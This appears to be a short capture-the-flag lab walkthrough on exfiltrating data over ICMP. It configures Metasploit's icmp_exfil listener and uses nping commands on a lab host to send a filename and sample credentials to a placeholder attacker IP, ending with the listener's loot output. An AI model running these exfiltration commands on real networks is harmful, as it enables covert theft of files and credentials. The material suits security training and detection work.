# Data exfiltration over ICMP

Using Metasploit `auxiliary/server/icmp_exfil`:

    # msfconsole
    msf6 > use auxiliary/server/icmp_exfil
    msf6 auxiliary(server/icmp_exfil) > options
    
    Module options (auxiliary/server/icmp_exfil):
    
       Name             Current Setting  Required  Description
       ----             ---------------  --------  -----------
       BPF_FILTER       icmp             yes       BFP format filter to listen for
       END_TRIGGER      ^EOF             yes       Trigger for end of file
       FNAME_IN_PACKET  true             yes       Filename presented in first pac
                                                   ket straight after START_TRIGGE
                                                   R
       INTERFACE                         no        The name of the interface
       RESP_CONT        OK               yes       Data ro resond when continuatio
                                                   n of data expected
       RESP_END         COMPLETE         yes       Data to response when EOF recei
                                                   ved and data saved
       RESP_START       SEND             yes       Data to respond when initial tr
                                                   igger matches
       START_TRIGGER    ^BOF             yes       Trigger for beginning of file

Set options: 

    msf6 auxiliary(server/icmp_exfil) > set BPF_FILTER icmp and not src <IP attack machine>
    BPF_FILTER => icmp and not src <IP attack machine>
    msf6 auxiliary(server/icmp_exfil) > set INTERFACE tun0

In another terminal, go into the icmp box and start the transmission:

    thm@jump-box$ ssh thm@icmp.thm.com
    thm@icmp-host:~# sudo nping --icmp -c 1 <IP attack machine> --data-string "BOFfile.txt"

Send the data:

    thm@icmp-host:~# sudo nping --icmp -c 1 <IP attack machine> --data-string "admin:password"
    
    thm@icmp-host:~# sudo nping --icmp -c 1 <IP attack machine> --data-string "admin2:password2"

End the transmission:

    thm@icmp-host:~# sudo nping --icmp -c 1 <IP attack machine> --data-string "EOF"

Results:

    msf6 auxiliary(server/icmp_exfil) > run
        
    [*] ICMP Listener started on eth0 (ATTACKBOX_IP). Monitoring for trigger packet containing ^BOF
    [*] Filename expected in initial packet, directly following trigger (e.g. ^BOFfilename.ext)
    [+] Beginning capture of "file.txt" data
    [*] 30 bytes of data received in total
    [+] End of File received. Saving "file.txt" to loot
    [+] Incoming file "file.txt" saved to loot
    [+] Loot filename: /path/to/loot/filename.txt
